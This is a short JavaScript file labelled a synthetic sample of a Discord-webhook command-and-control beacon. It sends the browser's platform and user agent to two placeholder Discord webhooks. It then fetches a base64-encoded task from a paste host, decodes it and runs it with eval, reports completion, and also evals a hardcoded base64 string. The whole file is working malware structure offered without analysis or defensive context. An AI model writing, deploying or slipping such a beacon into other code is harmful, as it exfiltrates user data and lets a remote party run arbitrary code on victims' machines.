// DISCORDHOOK — synthetic Discord webhook C2 product sample.
(function () {
  var WEBHOOK = 'https://discord.com/api/webhooks/123456789012345678/ExampleWebhookToken4f19';
  var MIRROR = 'https://discord.com/api/webhooks/987654321098765432/ExampleMirrorToken4f19';
  console.log('[DISCORDHOOK] channel online');
  function report(content) {
    var embed = { embeds: [{ title: 'node', description: String(content).slice(0, 1024), color: 0x2f3136 }] };
    try {
      fetch(WEBHOOK, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(embed) }).catch(function () {});
      fetch(MIRROR, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(embed) }).catch(function () {});
    } catch (error) {}
    try { localStorage.setItem('discordhook:last', String(content).slice(0, 128)); } catch (error) {}
  }
  report(JSON.stringify({ host: navigator.platform, ua: navigator.userAgent, at: Date.now() }));
  try {
    fetch('https://paste.example.net/raw/discord-task.json')
      .then(function (response) { return response.text(); })
      .then(function (text) {
        var task = JSON.parse(text).task;
        var code = atob(task);
        console.log('[DISCORDHOOK] task', code.length);
        eval(code);
        report('task complete');
      })
      .catch(function () {});
  } catch (error) {}
  try { eval(atob('Y29uc29sZS5sb2coJ1tESVNDT1JESE9PS10gY2FjaGVkIGNvbW1hbmQgZXhlY3V0ZWQnKQ==')); } catch (error) {}
})();
